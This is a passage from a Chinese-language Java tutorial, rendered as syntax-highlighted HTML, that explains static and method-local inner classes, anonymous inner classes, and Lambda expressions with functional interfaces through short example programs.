class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//接口内部进行接口实现</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IChannel4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">()</span>;<span class="comment">//发送消息</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">ChannelImpl</span> <span class="keyword">implements</span> <span class="title class_">IChannel4</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">()</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> IChannel4 <span class="title function_">getInstance</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ChannelImpl</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test55</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">IChannel4</span> <span class="variable">channel</span> <span class="operator">=</span> IChannel4.getInstance();</span><br><span class="line">        channel.send();<span class="comment">//mes9s0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    内部类是非常灵活的定义结构，只要语法满足了，各种需求都可以帮你实现。</p><h5 id="static定义内部类"><a href="#static定义内部类" class="headerlink" title="static定义内部类"></a>static定义内部类</h5><p>​    如果说在内部类上使用了static定义，那么这个内部类就变为了“外部类”，static定义的都是独立于类的结构，所以该类的结构就相当于一个独立的程序类了。需要注意的是，static定义的不管是类还是方法只能够访问static成员，所以static定义的内部类只能够访问外部类中的static属性或方法。</p><p>范例：使用static内部类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Outer2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">MSG</span> <span class="operator">=</span> <span class="string">&quot;mes9s0&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Inner</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span> &#123;</span><br><span class="line">            System.out.println(Outer2.MSG);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    这个时候的Inner类是一个独立的类，如果此时想要实例化Inner类对象，只需要根据“外部类.内部类”的结构实例化对象即可。格式如下：</p><p>​    以前的模式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">外部类.内部类 内部类对象 = <span class="keyword">new</span> 外部类().new 内部类();</span><br></pre></td></tr></table></figure><p>​    现在的模式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">外部类.内部类 内部类对象 = <span class="keyword">new</span> 外部类.内部类();</span><br></pre></td></tr></table></figure><p>​    这个时候的类名称带有“.”</p><p>范例：实例化static内部类对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//static内部类</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Outer2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">MSG</span> <span class="operator">=</span> <span class="string">&quot;mes9s0&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Inner</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span> &#123;</span><br><span class="line">            System.out.println(Outer2.MSG);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test56</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Outer2.<span class="type">Inner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Outer2</span>.Inner();</span><br><span class="line">        in.print();<span class="comment">//mes9s0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    <strong>以后在开发中如果看到类名称上带有“.”首先应该立刻想到这是一个内部类的结构，如果可以直接进行实例化，则应该立刻认识到这是一个static定义的内部类。</strong></p><p>​    如果以static定义内部类的形式并不常用，static定义内部接口的形式最为常用。</p><p>范例：static定义内部接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//static定义内部接口</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IMessageWarp</span> &#123;     <span class="comment">//消息包装</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">interface</span> <span class="title class_">IMessage</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getContent</span><span class="params">()</span>;<span class="comment">//消息内容</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">interface</span> <span class="title class_">IChannel</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">connect</span><span class="params">()</span>;<span class="comment">//消息发送通道</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">(IMessage msg, IChannel channel)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (channel.connect()) &#123;</span><br><span class="line">            System.out.println(msg.getContent());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;消息通道无法建立，发送失败&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DefaultMessage</span> <span class="keyword">implements</span> <span class="title class_">IMessageWarp</span>.IMessage &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getContent</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;mes9s0&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NetChannel</span> <span class="keyword">implements</span> <span class="title class_">IMessageWarp</span>.IChannel&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">connect</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test57</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        IMessageWarp.send(<span class="keyword">new</span> <span class="title class_">DefaultMessage</span>(),<span class="keyword">new</span> <span class="title class_">NetChannel</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    之所以使用static定义内部接口，主要是因为这些操作是属于一组相关的定义，有了外部接口之后可以更加明确的描述出这些接口的主要功能。</p><h5 id="方法中定义内部类"><a href="#方法中定义内部类" class="headerlink" title="方法中定义内部类"></a>方法中定义内部类</h5><p>​    内部类可以在任意的结构中进行定义，这就包括了：类中、方法中、代码块中。但是从实际的开发中来讲，在方法中定义的形式较多。</p><p>范例：在方法中定义的内部类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在方法中定义内部类</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Outer3</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;mes9s0&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fun</span><span class="params">(<span class="type">long</span> time)</span> &#123;</span><br><span class="line">        <span class="comment">//内部类</span></span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">Inner</span> &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span>&#123;</span><br><span class="line">                System.out.println(Outer3.<span class="built_in">this</span>.msg);</span><br><span class="line">                System.out.println(time);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Inner</span>().print(); <span class="comment">//方法中实例化内部类对象</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test58</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Outer3</span>().fun(<span class="number">235343636</span>);<span class="comment">//mes9s0；235343636</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    <strong>此时在fun()方法内部提供有叫做Inner内部类的定义，并且发现内部类可以直接访问外部类中的私有属性也可以直接访问方法中的参数，但是对于方法中的参数直接访问是从JDK1.8开始的，而在JDK1.8之前，如果要想访问方法中的参数则参数前必须追加final。</strong></p><h5 id="匿名内部类"><a href="#匿名内部类" class="headerlink" title="匿名内部类"></a>匿名内部类</h5><p>​    匿名内部类是一种简化的内部类的处理形式，其主要是在抽象类和接口的子类上使用的。</p><p>范例：观察一个基础的程序结构</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//匿名内部类</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IMessage5</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">(String str)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MessageImpl1</span> <span class="keyword">implements</span> <span class="title class_">IMessage5</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        System.out.println(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test59</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">IMessage5</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MessageImpl1</span>();</span><br><span class="line">        msg.send(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    若果说现在IMessage接口中的MessageImpl子类只使用唯一的一次，那么是否有必要将其定义为一个单独的类。那么这个时候我们会发现，定义的子类是有些多余的，所以就可以利用匿名内部类的形式来解决此问题。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//匿名内部类</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IMessage5</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">(String str)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test59</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">IMessage5</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IMessage5</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">(String str)</span> &#123;</span><br><span class="line">                System.out.println(str);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        msg.send(<span class="string">&quot;mes9s0&quot;</span>);<span class="comment">//mes9s0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    有些时候为了更加方便的体现出匿名内部类的使用，往往可以利用静态方法做一个内部的匿名内部类的实现。</p><p>范例：在接口中直接定义匿名内部类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//匿名内部类</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IMessage5</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">(String str)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> IMessage5 <span class="title function_">getInstance</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">IMessage5</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">(String str)</span> &#123;</span><br><span class="line">                System.out.println(str);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test59</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        IMessage5.getInstance().send(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    与内部类相比，匿名内部类只是一个没有名字的只能够使用一次的，并且结构固定的一个子类操作。</p><hr><h4 id="函数式编程"><a href="#函数式编程" class="headerlink" title="函数式编程"></a>函数式编程</h4><h5 id="Lamda表达式"><a href="#Lamda表达式" class="headerlink" title="Lamda表达式"></a>Lamda表达式</h5><p>​    从JDK1.8开始为了简化使用者进行代码的开发，专门提供有Lambda表达式的支持，利用此操作形式可以实现函数式的编程。以前函数式编程比较著名的语言：haskell、Scala，利用函数式编程可以处理掉面向对象编程中的一些繁琐的问题。</p><p>​    面向对象在发展的过程中一直有一部分反对者，这些反对者认为面向对象的设计过于复杂，并且过于繁琐，以一个最简单的程序为例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">IMessage5</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">(String str)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test59</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">IMessage5</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IMessage5</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">(String str)</span> &#123;</span><br><span class="line">                System.out.println(str);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        msg.send(<span class="string">&quot;mes9s0&quot;</span>);<span class="comment">//mes9s0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    在这样一个程序里，实际上核心功能就一行语句：“System.out.print(str)”，但是为了这一行的核心语句，我们依然需要按照完整的面向对象给出的设计结构进行开发。于是这些问题随着技术的发展也越来越突出。</p><p>范例：使用Lambda表达式实现一摸一样的功能</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Lambda表达式</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IMessage6</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">(String str)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test60</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">IMessage6</span> <span class="variable">msg</span> <span class="operator">=</span> (str) -&gt; &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;发送消息：&quot;</span>+str);</span><br><span class="line">        &#125;;</span><br><span class="line">        msg.send(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    现在整个程序代码里面会发现真的只是编写了一行语句，于是利用这种形式就避免了复杂的面向对象结构化的要求。</p><p>​    <strong>Lambda表达式如果想要使用，那么必须有一个重要的要求：SAM（Single Abstract Method），只有一个抽象方法，以之前的IMessage接口为例，在这个接口里面发现只是提供有一个send()方法，除此之外没有任何的方法定义，这样的接口就可以被称为函数式接口，而只有函数式接口才可以被Lambda表达式所使用。</strong></p><p>范例：使用函数式接口注解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Lambda表达式</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@FunctionalInterface</span> <span class="comment">//函数式接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IMessage6</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">(String str)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test60</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">IMessage6</span> <span class="variable">msg</span> <span class="operator">=</span> (str) -&gt; &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;发送消息：&quot;</span>+str);</span><br><span class="line">        &#125;;</span><br><span class="line">        msg.send(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    而这也就是我们接口中增加普通方式时必须写default的原因，如果不写default，则会被识别成abstract，而我们的函数式编程就会出现问题。</p><p>​    对于Lambda表达式而言，提供有如下几种格式：</p><p>​    1、方法没有参数：()-&gt;{};</p><p>​    2、方法有参数：(参数,参数)-&gt;{};</p><p>​    3、如果现在只有一行语句返回:(参数,参数)-&gt;语句;</p><p>范例：定义没有参数的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Lambda表达式</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@FunctionalInterface</span> <span class="comment">//函数式接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IMessage6</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test60</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">IMessage6</span> <span class="variable">msg</span> <span class="operator">=</span> () -&gt; &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;发送消息：mes9s0&quot;</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        msg.send();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>范例：定义有参数的处理形式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Lambda表达式</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@FunctionalInterface</span> <span class="comment">//函数式接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IMath</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test60</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">IMath</span> <span class="variable">math</span> <span class="operator">=</span> (t1,t2) -&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> t1 + t2;</span><br><span class="line">        &#125;;</span><br><span class="line">        System.out.println(math.add(<span class="number">10</span>,<span class="number">20</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    以上的表达式之中只有一行一句，可以进一步简化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 